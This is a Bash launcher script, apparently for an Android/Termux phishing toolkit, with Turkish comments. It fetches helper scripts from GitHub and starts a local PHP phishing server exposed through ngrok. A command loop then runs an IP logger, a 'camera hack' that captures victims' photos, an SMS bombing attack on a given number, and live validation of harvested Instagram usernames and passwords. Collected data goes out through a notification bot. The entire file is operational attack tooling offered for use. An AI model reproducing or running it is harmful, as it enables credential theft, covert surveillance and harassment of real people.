#!/bin/bash


# WGET PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/wget ]];then
	echo
	echo
	echo
	printf "\e[32m
	╔════════════════════╗
	║ ✓ \e[97mWGET KURULUYOR.. \e[32m║
	╚════════════════════╝\e[97m"
	sleep 0.5
	echo
	echo
	echo
	pkg install wget -y
fi

# SCRİPTS CONTROLS

if [[ ! -a files/update.sh ]];then
	echo
	echo
	echo
	printf "\e[32m
	╔═════════════════════════════════╗
	║ ✓ \e[97mGEREKLİ SCRİPTLER KURULUYOR.. \e[32m║
	╚═════════════════════════════════╝\e[97m"
	sleep 0.5
	echo
	echo
	echo

	# UPDATE.SH ( GÜNCELLEME SCRİPTİ )

	wget -O files/update.sh  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/update.sh

	# BOT_UMUTKARATOOLS ( BİLDİRİM SCRİPTİ )

	wget -O $PREFIX/bin/bot_umutkaratools  https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/bot_umutkaratools

	# LİNK-CREATE ( LİNK OLUŞTURMA SCRİPTİ )

	wget -O $PREFIX/bin/link-create https://raw.githubusercontent.com/umutkara-tools/UMUT-KARA-TOOLS/master/files/commands/link-create

	chmod 777 $PREFIX/bin/*

fi



# SETUP CONTROL

if [[ -a files/setup.sh ]];then
	cd files
	bash setup.sh
	mv setup.sh .setup.sh
	if [[ -a $PREFIX/lib/WIT ]];then
		rm -rf $PREFIX/lib/WIT
	fi
	mv ../../WIT $PREFIX/lib
	exit
fi

# TERMUX APİ CONTROL

if [[ ! -a /data/data/com.termux/files/usr/lib/.successful ]];then
	control=$(timeout 5 termux-battery-status |wc -l)
	if [[ $control != 0 ]];then
		touch $PREFIX/lib/.successful
		echo
		echo
		echo
		printf "\e[32m
		╔═════════════════════════════════════════╗
		║ ✓ \e[97mTERMUX APİ BİLDİRİM MODU TANIMLANDI.. \e[32m║
		╚═════════════════════════════════════════╝\e[97m"
		echo
		echo
		echo
		sleep 1
	fi
fi		

ngrok_control=$(ps aux | grep ngrok | grep -v grep |grep -o http)
if [[ -n $ngrok_control ]];then
	killall ngrok
fi
php_control=$(ps aux |grep php |grep -v grep |grep "127.0.0.1:")
if [[ -n $php_control ]];then
	killall php
fi

clear
cd files
##### UPDATE #####

bash update.sh --control
if [[ -a ../updates_infos ]];then
	rm ../updates_infos
	exit
fi
if [[ ! -a $PREFIX/lib/.bot_config ]];then
	exit
fi
##################

bash banner.sh
sleep 1
printf "\n\n\n\e[1;33m
\t╔══════════════════════════════════════╗
\t║                                      ║
\t║     \e[97mＹÖＮＬＥＮＤİＲＭＥ             \e[33m║
\t║                                      ║
\t║     \e[97mＢＡŞＬＡＴＩＬＩＹＯＲ          \e[33m║
\t║                                      ║
\t║                                      ║
\t║     ＬÜＴＦＥＮ ＢＥＫＬＥＹİＮİＺ   ║
\t║                                      ║
\t║                                      ║
\t╚══════════════════════════════════════╝\e[97m\n\n\n"
sleep 2

php -S 127.0.0.1:4444 > /dev/null &
sleep 0.5
am start -a android.intent.action.VIEW http://localhost:4444

########## COMMANDS ##########

while :
do
	cd /data/data/com.termux/files/usr/lib/WIT/files
	control=$(tree -i -f |grep -o _command |sed -n 1p |wc -l)
	_command_location_file=$(tree -i -f |grep _command)
	if [[ $control == 1 ]];then
		rm $_command_location_file
	else
		break
	fi
done

login_py_location="/data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/instagram"
links_location="/data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files"
while :
do
	cd /data/data/com.termux/files/usr/lib/WIT/files
	control=$(tree -i -f |grep -o _command |sed -n 1p |wc -l)
	if [[ $control == 1 ]];then
		_command_location_file=$(tree -i -f |grep _command)
		_command=$(cat $_command_location_file |sed -n 1p)
		location=$(dirname $_command_location_file)
		cd $location

		# EXİT

		if [[ $_command == exit ]];then
			ngrok_control=$(ps aux | grep ngrok | grep -v grep |grep -o http)
			if [[ -n $ngrok_control ]];then
				killall ngrok
			fi
			php_control=$(ps aux |grep php |grep -v grep |grep "127.0.0.1:")
			if [[ -n $php_control ]];then
				killall php
			fi
			rm _command
			exit
		fi

		# LİNK CREATE

		if [[ $_command == link-create ]];then
			link-create --wit
			rm _command
		fi

		# İP LOGGER

		if [[ $_command == ip-logger ]];then
			link-create --wit
			cat $links_location/links.txt |grep -o \"https://[^,]\*.ngrok.io\" |tr -d '"' |sed -n 1p |awk -F 'https://' '{print $2}'  >> refresh_url
			rm $links_location/links.txt
			rm _command
		fi

		# CAMERA HACK

		if [[ $_command == camera-hack ]];then
			sed "s/camera-hack//g" _command > .info
			bot_umutkaratools --send
			rm _command
			while :
			do
				control_1=$(cat saved_info.txt |wc -l)
				sleep 2
				control_2=$(cat saved_info.txt |wc -l)
				if [[ $control_1 = $control_2 ]];then
					rm _command
					break
				fi
			done
			total=$(cat total |wc -l)
			echo -e "
			+-+-+ CAMERA HACK +-+-+

			 $total ADET RESİM ALINDI

			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+" > .info
			bot_umutkaratools --send
			rm total
		fi

		# SMS-ATTACK
		
		s_a_control=$(echo "$_command" |grep -o sms-attack)
		if [[ $s_a_control == sms-attack ]];then
			seconds=$(cat _command |sed -n 2p)
			number=$(cat _command |sed -n 3p)
			timeout $seconds python ../main.py $number
			rm _command
		fi

		# İNSTAGRAM LOGİN CONTROL

		login_control=$(echo "$_command" |grep -o Loginn)
		if [[ $login_control == Loginn ]];then
			username=$(cat _command |sed -n 2p |awk '{print $1}')
			password=$(cat _command |sed -n 2p |awk '{print $2}')
			python $login_py_location/instagram-login.py $username $password > output
			success=$(cat output |sed -n 2p)
			success_2=$(cat output |sed -n 2p |grep -o two)
			if [[ $success == invalid_user || $success == bad_password ]];then
				echo "false" > output
				rm _command
			elif [[ $success == Successful ]];then
				echo "true" > output
				rm _command

			fi
			if [[ $success_2 == two ]];then
				echo "two" > output
				rm _command
			fi
			if [[ -a _command ]];then
				echo "false" > output
				rm _command
			fi
		fi

		# İNFO SEND

		if [[ -a _command ]];then
			cat _command > .info
			bot_umutkaratools --send
			rm _command
		fi
	fi
done


##############################
